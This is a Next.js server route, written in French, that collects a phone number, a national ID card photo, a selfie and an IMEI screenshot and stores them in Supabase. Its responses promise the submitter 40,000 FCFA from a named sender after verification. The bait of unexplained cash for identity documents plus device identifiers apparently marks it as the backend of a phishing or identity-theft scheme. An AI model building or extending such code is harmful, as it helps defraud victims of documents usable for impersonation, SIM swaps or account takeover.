export const runtime = "nodejs"
export const maxDuration = 60

import { NextRequest, NextResponse } from 'next/server'
import { createClient } from '@supabase/supabase-js'

const supabase = createClient(
  process.env.SUPABASE_URL!,
  process.env.SUPABASE_ANON_KEY!
)

export async function POST(request: NextRequest) {
  console.log("📩 API appelée : /api/submit-identification")

  try {
    const formData = await request.formData()
    console.log("📦 FormData reçu")

    const numero = formData.get('numero') as string
    const personPhoto = formData.get('personPhoto') as File
    const screenshot = formData.get('screenshot') as File
    const identityCard = formData.get('identityCard') as File

    console.log("➡️ Numéro :", numero)
    console.log("➡️ CIP :", identityCard?.name)
    console.log("➡️ Selfie :", personPhoto?.name)
    console.log("➡️ Screenshot IMEI :", screenshot?.name)

    // Vérification des champs obligatoires
    if (!numero || !personPhoto || !screenshot || !identityCard) {
      console.log("❌ Champs manquants")
      return NextResponse.json(
        { error: "Tous les documents sont obligatoires pour recevoir les 40,000 FCFA" },
        { status: 400 }
      )
    }

    // ------ IMPORTANT ------
    // ⚠️ TON BUCKET = "kj"
    const BUCKET = "kj"

    // Fonction upload
    const uploadFile = async (file: File, path: string) => {
      console.log(`📤 Upload → ${path}`)

      const buffer = Buffer.from(await file.arrayBuffer())

      const { data, error } = await supabase.storage
        .from(BUCKET)
        .upload(path, buffer, {
          contentType: file.type,
          upsert: false
        })

      if (error) {
        console.error("❌ Erreur upload Supabase:", error)
        throw error
      }

      console.log("✅ Upload réussi :", data)
      return data
    }

    const timestamp = Date.now()
    const uniqueId = Math.random().toString(36).slice(2)

    const identityCardName = `documents/cip-${timestamp}-${uniqueId}.jpg`
    const personPhotoName = `photos/selfie-${timestamp}-${uniqueId}.jpg`
    const screenshotName = `screenshots/imei-${timestamp}-${uniqueId}.jpg`

    // Uploads
    await uploadFile(identityCard, identityCardName)
    await uploadFile(personPhoto, personPhotoName)
    await uploadFile(screenshot, screenshotName)

    // Insert SQL
    console.log("🗄️ Insertion SQL...")

    const { data, error } = await supabase
      .from("paiements_emmanuel")
      .insert([
        {
          numero_telephone: numero,
          carte_cip_url: identityCardName,
          photo_selfie_url: personPhotoName,
          capture_imei_url: screenshotName,
          statut: "en_attente_verification",
          montant: 40000,
          envoyeur: "Sano Emmanuel",
          date_soumission: new Date().toISOString(),
          date_suppression: new Date(Date.now() + 86400000).toISOString() // +24h
        }
      ])
      .select()

    if (error) {
      console.error("❌ Erreur SQL Supabase:", error)
      return NextResponse.json(
        { error: "Erreur lors de l'enregistrement sécurisé" },
        { status: 500 }
      )
    }

    console.log("✅ SQL OK :", data)

    return NextResponse.json({
      success: true,
      message: "Documents reçus ! Vérification en cours. Vous recevrez 40,000 FCFA après validation.",
      id: data[0].id,
      montant: 40000,
      delai: "24h après vérification",
      processus: "Vérification visuelle CIP + Selfie en cours"
    })

  } catch (error) {
    console.error("❌ Erreur serveur:", error)
    return NextResponse.json(
      { error: "Erreur de traitement sécurisé" },
      { status: 500 }
    )
  }
}
